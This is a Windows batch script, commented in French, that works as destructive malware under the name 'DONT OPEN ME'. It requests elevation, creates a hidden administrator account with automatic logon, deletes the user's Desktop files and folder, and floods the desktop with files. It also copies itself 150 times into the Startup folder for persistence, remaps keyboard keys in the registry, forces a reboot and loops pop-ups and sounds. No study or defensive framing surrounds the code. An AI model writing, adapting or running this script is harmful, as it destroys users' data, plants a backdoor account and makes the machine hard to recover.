@echo off

:: Vérifier les privilèges administratifs
net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

:: Créer un effet de fenêtre choquante dès le début
powershell -Command "[System.Windows.Forms.MessageBox]::Show('ALERT! DONT OPEN ME IS HERE. THIS SYSTEM IS NO LONGER YOURS! WARNING!', 'Critical Error', [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)"

:: Ajouter un effet sonore plus percutant dès l'ouverture
powershell -c (New-Object Media.SoundPlayer "C:\Windows\Media\Windows Critical Stop.wav").PlaySync()

:: Créer une fenêtre de terminal avec des messages continus
start cmd /c echo WARNING: SYSTEM COMPROMISED && echo DONT OPEN ME IS HERE && pause && exit

:: Créer un utilisateur avec des privilèges administratifs
net user "DONT OPEN ME" /add
net localgroup Administrateurs "DONT OPEN ME" /add

:: Activer la connexion automatique
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon /t REG_SZ /d 1 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName /t REG_SZ /d "DONT OPEN ME" /f

:: Créer des fichiers et modifier le bureau
set desktop=%userprofile%\Desktop
del /f /q "%desktop%\*" >nul 2>&1
rmdir /s /q "%desktop%" >nul 2>&1

for /l %%i in (1,1,300) do (
    echo DONT OPEN ME IS HERE > "%desktop%\DONT_OPEN_ME_IS_HERE_%%i.txt"
)

:: Modifier le fond d'écran en rouge vif avec un message choquant
set wallpaper=%userprofile%\Desktop\DONT_OPEN_ME_RED.bmp
powershell -Command "& {
    $Width = 1920; $Height = 1080;
    $bitmap = New-Object Drawing.Bitmap $Width, $Height;
    $graphics = [Drawing.Graphics]::FromImage($bitmap);
    $redBrush = New-Object Drawing.SolidBrush ([Drawing.Color]::FromArgb(255, 255, 0, 0));
    $whiteBrush = New-Object Drawing.SolidBrush ([Drawing.Color]::White);
    $font = New-Object Drawing.Font('Arial', 48, [Drawing.FontStyle]::Bold);
    $graphics.FillRectangle($redBrush, 0, 0, $Width, $Height);
    $graphics.DrawString('DONT OPEN ME IS HERE', $font, $whiteBrush, 200, 400);
    $bitmap.Save('%wallpaper%');
}"

reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%wallpaper%" /f
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters

:: Ajout des fichiers dans le dossier de démarrage pour une persistance
set startup_folder=%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
for /l %%i in (1,1,150) do (
    setlocal enabledelayedexpansion
    set random_name=!random!!random!
    copy "%~f0" "%startup_folder%\DONT_OPEN_ME_!random_name!.bat"
    endlocal
)

:: Modifier le mappage des touches pour bloquer certains raccourcis
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Keyboard Layout" /v Scancode Map /t REG_BINARY /d 00000000000000000400000000005be000005be000000000 /f

:: Modifier le titre de la fenêtre de commande
title DONT OPEN ME IS HERE

:: Message d'alerte avec effet visuel
msg * "DONT OPEN ME HAS TAKEN OVER. THIS SYSTEM IS NO LONGER YOURS. WARNING!"
timeout /t 3 >nul

:: Redémarrer le système après un délai
shutdown /r /f /t 15

:: Boucle pour afficher des messages d'erreur en continu
for /l %%i in (1,1,150) do (
    start cmd /c echo DONT OPEN ME IS HERE && pause
)

:: Effet sonore en boucle pour renforcer l'effet choquant
:loop
    powershell -c (New-Object Media.SoundPlayer "C:\Windows\Media\chimes.wav").PlaySync()
    set log_file=%desktop%\DONT_OPEN_ME_LOG_!random!.txt
    echo YOU CANNOT ESCAPE ME > %log_file%
    powershell -Command "[System.Windows.Forms.MessageBox]::Show('DONT OPEN ME IS HERE', 'Error', [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)"
    start http://DONTOPENME
    powershell -c "(New-Object -ComObject SAPI.SpVoice).Speak('DONT OPEN ME IS HERE')"
    timeout /t 5 >nul
    goto loop
